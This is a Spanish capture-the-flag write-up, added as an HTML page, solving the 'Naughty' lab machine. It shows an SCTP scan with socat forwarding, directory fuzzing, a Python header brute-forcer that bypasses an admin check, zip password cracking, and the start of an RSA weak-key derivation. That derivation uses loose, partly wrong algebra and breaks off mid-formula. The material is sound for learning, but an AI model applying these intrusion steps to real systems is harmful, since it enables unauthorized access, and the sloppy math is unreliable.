@@ -1,0 +1,939 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Naughty S4vitar</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/naughty.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Naughty S4vitar" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Naughty creada por S4vitar" />
+<meta property="og:description" content="Resolución de la máquina Naughty creada por S4vitar" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Naughty S4vitar" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Naughty S4vitar" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Naughty creada por S4vitar","headline":"Writeup Naughty S4vitar","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Naughty S4vitar</h1>
+          <p>Resolución de la máquina Naughty creada por S4vitar</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap, pero no encontramos nada por TCP</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.71
+Nmap scan report for 192.168.100.71
+All 1000 scanned ports on 192.168.100.71 are in ignored states.
+Not shown: 1000 closed tcp ports (conn-refused)</span>
+</code></pre></div></div>
+
+<div><p>No hay puertos tampoco por UDP sin embargo por SCTP encontramos el puerto 22 y el 80</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo nmap</span><span class="p"> -sY 192.168.100.71
+Nmap scan report for 192.168.100.71
+PORT    STATE SERVICE
+22/sctp open  ssh
+80/sctp open  http</span>
+</code></pre></div></div>
+
+<div><p>Hay que tener en cuenta que de primeras no podemos acceder por SCTP directamente, la mejor forma es apuntar al localhost por TCP y redirigir la peticion a SCTP a la máquina real</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo socat </span><span class="p">TCP-LISTEN:22,fork sctp:192.168.100.71:22 &
+
+</span><span class="s2">❯ sudo socat </span><span class="p">TCP-LISTEN:80,fork sctp:192.168.100.71:80 &
+</span>
+</code></pre></div></div>
+
+<div><p>Al apuntar a la web por el localhost lo unico que vemos es un 403 forbidden</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Siguiendo el principio de las maquinas podemos agregar naughty.htb como vhost de la 127.0.0.1</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">"127.0.0.1 naughty.htb" </span><span class="p">|</span><span class="s2"> sudo tee </span><span class="p">-a /etc/hosts
+</span>
+</code></pre></div></div>
+
+<div><p>Al abrir la web mediante el dominio naughty.htb vemos un calendario, pero no nos sirve de mucho</p></div>
+<a href="./2.png" target="_blank"><div><p><img src="./2.png"><p></div></a>
+
+<div><p>Con wfuzz podemos intentar fuzzear directorios pero por ahora todos nos devuelve un 302 redirect</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://naughty.htb/FUZZ -t 100
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://naughty.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "cgi-bin"
+000000006:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "templates"
+000000005:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "modules"
+000000004:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "includes"
+000000003:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "admin"
+000000002:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "images"
+000000008:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "media"
+000000013:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "wp-content"
+000000012:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "search"
+000000014:   </span><span class="na">302</span><span class="p">        7 L      18 W       211 Ch      "scripts"</span>
+</code></pre></div></div>
+
+<div><p>Usando el parámetro -L podemos hacer un follow del redirect pero ahora todo nos devuelve 200 ok</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://naughty.htb/FUZZ -t 100 -L
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://naughty.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000002:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "images"
+000000005:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "modules"
+000000003:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "admin"
+000000006:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "templates"
+000000008:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "media"
+000000004:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "includes"
+000000007:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "cache"
+000000001:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "cgi-bin"
+000000009:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "js"
+000000018:   </span><span class="s2">200</span><span class="p">        54 L     162 W      1738 Ch     "components"</span>
+</code></pre></div></div>
+
+<div><p>Todas las respuestas devuelven 1738 caracteres asi que lo que devuelva eso lo quitamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://naughty.htb/FUZZ -t 100 -L --hh 1738     
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://naughty.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000039:   </span><span class="s2">200</span><span class="p">        92 L     168 W      4021 Ch     "login"
+000000084:   </span><span class="s2">200</span><span class="p">        54 L     151 W      1681 Ch     "assets"
+000000139:   </span><span class="s2">200</span><span class="p">        54 L     151 W      1681 Ch     "javascript"</span>
+</code></pre></div></div>
+
+<div><p>Al abrirlo en el navegador podemos ver un login, esto tiene mejor pinta que antes</p></div>
+<a href="./3.png" target="_blank"><div><p><img src="./3.png"><p></div></a>
+
+<div><p>Podemos intentar usar credenciales por defecto como naughty.htb:admin o cosas asi</p></div>
+<a href="./4.png" target="_blank"><div><p><img src="./4.png"><p></div></a>
+
+<div><p>La máquina envia la data por GET y en realidad no hace nada, asi que dejemos esto a un lado</p></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>Con wfuzz fuzzeando por archivos .html encontramos admin.html entre otros más</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://naughty.htb/FUZZ.html -t 100 -L --hh 1738
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://naughty.htb/FUZZ.html
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000003:   </span><span class="s2">200</span><span class="p">        54 L     151 W      1681 Ch     "admin"
+000000022:   </span><span class="s2">200</span><span class="p">        54 L     151 W      1681 Ch     "user"
+000000129:   </span><span class="s2">200</span><span class="p">        54 L     151 W      1681 Ch     "mail"
+000000245:   </span><span class="s2">200</span><span class="p">        244 L    659 W      6153 Ch     "index"</span>
+</code></pre></div></div>
+
+<div><p>Al abrirlo desde el navegador automáticamente se nos redirige a la página 403 Forbidden</p></div>
+<a href="./6.png" target="_blank"><div><p><img src="./6.png"><p></div></a>
+
+<div><p>Podemos pasarlo por burpsuite y cambiar el 302 por un 300 pero no conseguimos nada realmente</p></div>
+<div><p><img src="./7.png"><p></div>
+<div><p><img src="./8.png"><p></div>   
+
+<div><p>Mirando las cabeceras de respuesta vemos algo interesante, existe NaughtyUser con un valor de 1</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">http://naughty.htb -I
+HTTP/1.1 200 OK
+Date: Thu, 02 Feb 2023 20:17:01 GMT
+Server: Apache
+X-Frame-Options: DENY
+Last-Modified: Wed, 09 Feb 2022 22:43:29 GMT
+ETag: "1809-5d79d90076ef5"
+Accept-Ranges: bytes
+Content-Length: 6153
+Vary: Accept-Encoding
+Access-Control-Allow-Origin: http://naughty.htb
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Content-Security-Policy: allow 'self';
+</span><span class="kd">NaughtyUser: 1</span><span class="p">
+Content-Type: text/html; charset=utf-8</span>
+</code></pre></div></div>
+
+<div><p>Es una cabecera de respuesta pero... ¿Puede haber otra cabecera entrante que nos otorgue acceso?</p></div>
+<div><p>La cabecera tiene una forma de Naughty mas un header común con la primera letra mayúscula, asi que creamos un nuevo diccionario de headers que tenga tenga las primeras letras mayusculas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sed</span><span class="p"> -e </span><span class="no">"s/\b\(.\)/\u\1/g"</span><span class="p"> /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt > headers.txt
+</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un script que como prefijo tenga Naughty y por cada linea del diccionario haga una petición, y por ahora para debuguear que nos muestre la longitud de la respuesta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import </span><span class="p">requests
+
+target </span><span class="kd">=</span><span class="s2"> "http://naughty.htb/admin.html"
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"headers.txt"</span><span class="p">,</span><span class="s2"> "r"</span><span class="p">) </span><span class="kd">as</span><span class="p"> file:
+    </span><span class="kd">for </span><span class="p">line </span><span class="kd">in</span><span class="p"> file:
+        header </span><span class="kd">=</span><span class="s2"> "Naughty" </span><span class="kd">+</span><span class="p"> line.strip()
+        headers </span><span class="kd">=</span><span class="p"> {header: </span><span class="s2">"1"</span><span class="p">}
+        request </span><span class="kd">=</span><span class="p"> requests.get(target, </span><span class="no">headers</span><span class="kd">=</span><span class="p">headers)
+        </span><span class="k">print</span><span class="p">(</span><span class="k">len</span><span class="p">(request.content))</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar podemos ver que todas las respuestas devuelven una longitud de 1681 caracteres</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">fuzzer.py
+1681
+1681
+1681
+1681</span>
+</code></pre></div></div>
+
+<div><p>Modificamos el script para cuando veamos una respuesta diferente la printearemos por pantalla</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">requests
+
+target </span><span class="kd">=</span><span class="s2"> "http://naughty.htb/admin.html"</span><span class="p">
+
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">""</span><span class="p">)
+counter </span><span class="kd">=</span><span class="na"> 1</span><span class="p">
+
+</span><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"headers.txt"</span><span class="p">,</span><span class="s2"> "r"</span><span class="p">)</span><span class="kd"> as</span><span class="p"> file:
+    </span><span class="kd">for </span><span class="p">line </span><span class="kd">in </span><span class="p">file:
+        header </span><span class="kd">=</span><span class="s2"> "Naughty" </span><span class="kd">+</span><span class="p"> line.strip()
+        bar.status(</span><span class="k">f</span><span class="s2">"Probando header ({counter}/2588): {header}"</span><span class="p">)
+        headers </span><span class="kd">=</span><span class="p"> {header: </span><span class="s2">"1"</span><span class="p">}
+        request </span><span class="kd">=</span><span class="p"> requests.get(target, </span><span class="no">headers</span><span class="kd">=</span><span class="p">headers)
+        counter </span><span class="kd">+=</span><span class="na"> 1</span><span class="p">
+
+        </span><span class="kd">if </span><span class="k">len</span><span class="p">(request.content) </span><span class="kd">!= </span><span class="na">1681</span><span class="p">:
+            bar.success(</span><span class="k">f</span><span class="s2">"Header válido: {header}"</span><span class="p">)
+            exit(</span><span class="na">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo empezará a probar todas las cabeceras mostrando lo pantalla el header que prueba</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">fuzzer.py
+[</span><span class="na">◒</span><span class="p">] Probando header (48/2588): NaughtyTab</span>
+</code></pre></div></div>
+
+<div><p>Despues de un rato nos reporta que la cabecera NaughtyAdmid es válida</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">fuzzer.py
+[</span><span class="s2">+</span><span class="p">] Header válido: NaughtyAdmid</span>
+</code></pre></div></div>
+
+<div><p>Bupsuite tiene una opcioón llamada Match and Replace que puede ser bastante util en este caso</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Agregamos una funcion que nos agrege NaughtyAdmid: 1 en todas las peticiónes que hagamos</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>Si pasamos por burpsuite ahora al acceder al admin.html vemos lo que parece un panel de usuario</p></div>
+<a href="./11.png" target="_blank"><div><p><img src="./11.png"><p></div></a>
+
+<div><p>En el campo de usuario podemos encontrar la opción de ver los Mails recibidos</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>Podemos ver varios mails por ahora daremos un vistazo haciendo clic en el primero de ellos</p></div>
+<a href="./13.png" target="_blank"><div><p><img src="./13.png"><p></div></a>
+
+<div><p>Es una conversación entre Lenore Robinson y Nisrin Ahmed (wh1tedrvg0n)</p></div>
+<a href="./14.png" target="_blank"><div><p><img src="./14.png"><p></div></a>
+
+<div><p>En esta conversación Nisrin Ahmed nos comparte lo que parece una clave perm pública</p></div>
+<div><p><img src="./15.png"><p></div>
+
+<div><p>En la 3er mail Leonore nos comparte un zip y nos habla de ¿una contraseña que se usa en virus?</p></div>
+<a href="./16.png" target="_blank"><div><p><img src="./16.png"><p></div></a>
+
+<div><p>Veamos lo que tenemos el .pem es una clave RSA publica pero bastante pequeña (eso NO dijo ella)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> wh1tedrvg0n.pem
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk20cqEqzhdLnNOpaPL9w
+srQ2qAQV833B0GTtWJ8dqVMAsP4hrOShp14Mgwq7Mz6Z+BOxZhppWmWZ4ZJLAo8E
+JsLr7iWvSLK+hjaz23ENNZoG436TvCmBNN880JH7eIYQb/0DYgRNSqa473I88+4e
+D6PATfgYByLG7SsQvLv2FsEXYF0SW+WR9Nm3SsVpY0SPMgUfsld1K7h4xGck/lhg
+2/tA8nFtsH0OBb5EOC1+HeSMxHJI8xciQQndBwoKieWYqKD0r8ClL6MiVA1tCq3w
+cR9CsxXJNFWhntRr9eS4hi3mLXAEHXABaGwM+ptzWhegl+m5+gYFFTldVBrpsPvY
+0wIDAQAB
+-----END PUBLIC KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Seguimos con el zip, podemos usar john para crear un hash y romper la contraseña que es infected</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ zip2john </span><span class="p">data.zip > hash
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+</span><span class="kd">infected</span><span class="p">         (</span><span class="na">data.zip</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Al descomprimirlo nos crea una carpeta data con 3 archivos uno de ellos esta oculto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">data </span><span class="s2">❯ find</span><span class="p">
+.
+./.generator.backup
+./instructions.txt
+./message.encrypted</span>
+</code></pre></div></div>
+
+<div><p>Las instrucciones nos dicen que desencriptemos el mensaje usando la clave privada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">data </span><span class="s2">❯ cat </span><span class="p">instructions.txt
+The only instructions that you need to gain access is decrypt the message with 
+your private key. If you have any doubts, please contact me.</span>
+</code></pre></div></div>
+
+<div><p>El otro es el mensaje que no podemos leer, y por ultimo el mas importante un backup</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">data </span><span class="s2">❯ cat </span><span class="p">.generator.backup
+</span><span class="kd">require </span><span class="s2">'openssl'</span><span class="p">
+
+e </span><span class="kd">= </span><span class="na">65537
+</span><span class="kd">while </span><span class="na">true</span><span class="p">
+  p </span><span class="kd">=</span><span class="k"> OpenSSL</span><span class="p">::</span><span class="k">BN</span><span class="p">.generate_prime(</span><span class="na">1024</span><span class="p">,</span><span class="na"> false</span><span class="p">)
+  q </span><span class="kd">=</span><span class="k"> OpenSSL</span><span class="p">::</span><span class="k">BN</span><span class="p">.</span><span class="na">new</span><span class="p">(e).mod_inverse(p)
+  </span><span class="kd">next unless </span><span class="p">q.prime?
+  key </span><span class="kd">=</span><span class="k"> OpenSSL</span><span class="p">::</span><span class="k">PKey</span><span class="p">::</span><span class="k">RSA</span><span class="p">.</span><span class="na">new</span><span class="p">
+  key.set_key(</span><span class="k">p</span><span class="p">.</span><span class="k">to_i </span><span class="kd">*</span><span class="k"> q</span><span class="p">.</span><span class="k">to_i</span><span class="p">, e, </span><span class="na">nil</span><span class="p">)
+  </span><span class="k">File</span><span class="p">.write(</span><span class="s2">'wh1tedrvg0n.pem'</span><span class="p">, key.to_pem)
+  </span><span class="k">File</span><span class="p">.binwrite(</span><span class="s2">'message.encrypted'</span><span class="p">, key.public_encrypt(</span><span class="k">File</span><span class="p">.binread(</span><span class="s2">'message.txt'</span><span class="p">)))
+  </span><span class="kd">break
+end</span>
+</code></pre></div></div>
+
+<div><p>Dejando esto de lado repasemos que valores necesitamos para construir la clave privada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">RSA.construct((</span><span class="na">n</span><span class="p">, </span><span class="na">e</span><span class="p">, </span><span class="na">d</span><span class="p">, </span><span class="na">p</span><span class="p">, </span><span class="na">q</span><span class="p">))</span>
+</code></pre></div></div>
+
+<div><p>Ahora sabiendo esto podemos empezar a sacar los valores de la clave publica iniciando con n</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">Crypto.PublicKey </span><span class="kd">import </span><span class="p">RSA
+
+file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"wh1tedrvg0n.pem"</span><span class="p">, </span><span class="s2">"r"</span><span class="p">)
+key </span><span class="kd">=</span><span class="p"> RSA.importKey(file.read())
+
+n </span><span class="kd">=</span><span class="p"> key.n
+
+</span><span class="k">print</span><span class="p">(n)</span>
+</code></pre></div></div>
+
+<div><p>Podemos leer n el problema es que es demasiado grande y probablemente sea dificil factorizarlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">rsa.py
+18610835934412662362317829511171393239463749657652440980677110600927942905492015629622700026665957838241253327519347326977540433428316610234247938390935644044608243364718988540537680745480916135674723444328795584928427524528223898037742412097129114329230604994314590628910703907791635874720768591963337877180471956137309668299274445987133754293478714093340787943515488369755258670872737550689031108900947141043570077086541547667748073742737872417268119791981999027408499470552887188195292361948471238948750531475439102428213462152602428152792791383876168673695192432188723088093087294315404215703752526839202166069459</span>
+</code></pre></div></div>
+
+<div><p>Por ahora sigamos sacando valores podemos conseguir e de la misma manera de la clave publica</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">Crypto.PublicKey </span><span class="kd">import </span><span class="p">RSA
+
+file </span><span class="kd">=</span><span class="k"> open</span><span class="p">(</span><span class="s2">"wh1tedrvg0n.pem"</span><span class="p">, </span><span class="s2">"r"</span><span class="p">)
+key </span><span class="kd">=</span><span class="p"> RSA.importKey(file.read())
+
+e </span><span class="kd">=</span><span class="p"> key.e
+
+</span><span class="k">print</span><span class="p">(e)</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">rsa.py
+65537</span>
+</code></pre></div></div>
+
+<div><p>Podriamos seguir con p y q, el problema es que n es demasiado largo para factorizarlo y obtener los valores, asi que analizemos el código en ruby que parece ser el generador de la clave RSA</p></div>
+
+
+<div><p>p esta definido como un numero primo aleatorio, hasta aqui todo es normal</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">p </span><span class="kd">=</span><span class="k"> OpenSSL</span><span class="p">::</span><span class="k">BN</span><span class="p">.generate_prime(</span><span class="na">1024</span><span class="p">,</span><span class="na"> false</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>El detalle esta en q que no es un numero primo aleatorio sino que se define como e por mod_inverse de p, por lo que q depende de p y tenemos la operacion, esto lo facilita más</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">=</span><span class="k"> OpenSSL</span><span class="p">::</span><span class="k">BN</span><span class="p">.</span><span class="na">new</span><span class="p">(e).mod_inverse(p)</span>
+</code></pre></div></div>
+
+<div><p>Intentemos representar la operación que se usa para construir q</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">=</span><span class="p"> e </span><span class="kd">*</span><span class="p"> mod_inverse(p)</span>
+</code></pre></div></div>
+
+<div><p>Para eliminar el inverse y quedarnos con mod podemos pasar a e dividiendo la operación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">=</span><span class="p"> mod(p) </span><span class="kd">/</span><span class="p"> e</span>
+</code></pre></div></div>
+
+<div><p>Podemos multiplicar por e de ambos lados y nos quedaria una expresioón como la siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">=</span><span class="p"> (mod(p) </span><span class="kd">/</span><span class="p"> e) </span><span class="kd">*</span><span class="p"> e</span>
+</code></pre></div></div>
+
+<div><p>Con esto conseguimos que como multiplicamos y dividimos e se cancelen, nos que queda algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">=</span><span class="p"> mod(p)</span>
+</code></pre></div></div>
+
+<div><p>En este punto pasamos a usar el módulo de congruencia n que nos dice que se representa así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">a </span><span class="kd">=</span><span class="p"> b </span><span class="kd">*</span><span class="p"> mod(m)</span>
+</code></pre></div></div>
+
+<div><p>Se dice que b es igual a 1 por lo que aplicandolo a nuestro caso quedaría algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">=</span><span class="p"> 1 </span><span class="kd">*</span><span class="p"> mod(p)</span>
+</code></pre></div></div>
+
+<div><p>En donde la relación de congruencia se representaría de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">a </span><span class="kd">=</span><span class="p"> kn </span><span class="kd">+</span><span class="p"> b</span>
+</code></pre></div></div>
+
+<div><p>Hay que recordar que b es igual a 1 por lo que se puede representar de esta forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">a </span><span class="kd">=</span><span class="p"> kn </span><span class="kd">+</span><span class="p"> 1</span>
+</code></pre></div></div>
+
+<div><p>Usando nuestros nombres de valor en la relación de congruencia se representaria de esta manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">=</span><span class="p"> k </span><span class="kd">*</span><span class="p"> p </span><span class="kd">+</span><span class="p"> 1</span>
+</code></pre></div></div>
+
+<blockquote><strong><div><p>¿Adaptar nombres de valores?</p></div></strong>
+<div><p>En nuestro caso hay que tener en cuenta que los nombres y valores que tenemos son diferentes, para entenderlo mejor su equivalencia seria la siguiente<p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">a </span><span class="kd">=</span><span class="p"> q </span><span class="kd">*</span><span class="p"> e
+m </span><span class="kd">=</span><span class="p"> p
+kn </span><span class="kd">=</span><span class="p"> kp</span>
+</code></pre></div></div></blockquote><br>
+
+<div><p>Lo que haremos ahora será restar un 1 de ambos lados, la operación seria la siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">-</span><span class="p"> 1 </span><span class="kd">=</span><span class="p"> kp </span><span class="kd">+</span><span class="p"> 1 </span><span class="kd">-</span><span class="p"> 1</span>
+</code></pre></div></div>
+
+<div><p>Del lado derecho tenemos una suma y resta de una por lo que se cancelan, representemoslos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q </span><span class="kd">*</span><span class="p"> e </span><span class="kd">-</span><span class="p"> 1 </span><span class="kd">=</span><span class="p"> kp</span>
+</code></pre></div></div>
+
+<div><p>Ahora para facilitar las cosas multiplicamos q por ambos lados de modo que quedaría algo así</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q</span><span class="kd"> *</span><span class="p"> qe </span><span class="kd">-</span><span class="p"> 1 </span><span class="kd">=</span><span class="p"> kpq</span>
+</code></pre></div></div>
+
+<div><p>Otra forma de representarlo seria la siguiente, ya que q multiplicado por q nos da q al cuadrado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q</span><span class="kd">^</span><span class="p">2 </span><span class="kd">*</span><span class="p"> e </span><span class="kd">-</span><span class="p"> q </span><span class="kd">=</span><span class="p"> kpq</span>
+</code></pre></div></div>
+
+<div><p>Recordar que en RSA la multiplicacion de p por q nos da n asi que se representa de esta forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q</span><span class="kd">^</span><span class="p">2 </span><span class="kd">*</span><span class="p"> e </span><span class="kd">-</span><span class="p"> q </span><span class="kd">=</span><span class="p"> kn</span>
+</code></pre></div></div>
+
+<div><p>Si pasamos kn a la izquierda la representación quedaria de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">q</span><span class="kd">^</span><span class="p">2</span><span class="kd"> * </span><span class="p">e </span><span class="kd">-</span><span class="p"> q </span><span class="kd">-</span><span class="p"> kn </span><span class="kd">=</span><span class="p"> 0</span>
+</code></pre></div></div>
+
+<div><p>¿Esto que es?, simple, una fución de segundo grado también llamada función cuadrática, donde la formula para resolverla (Bhaskara) se representa de la siguiente manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
